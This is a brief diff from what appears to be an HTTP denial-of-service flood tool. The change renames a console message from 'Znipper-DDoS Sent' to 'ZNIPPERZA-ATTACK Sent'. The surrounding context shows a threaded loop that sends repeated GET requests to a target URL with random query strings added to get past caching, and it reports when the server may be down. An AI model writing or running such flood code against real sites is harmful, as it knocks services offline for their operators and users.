@@ -73,7 +73,7 @@ class httpth1(threading.Thread):
                 randomized_url = url + "?" + genstr(random.randint(3, 10))
                 requests.get(randomized_url, headers=headers)
                 count += 1
-                print ("{0} Znipper-DDoS Sent".format(count))
+                print ("{0} ZNIPPERZA-ATTACK Sent".format(count))
             except requests.exceptions.ConnectionError:
                 print ("[Server might be down!]")
                 pass
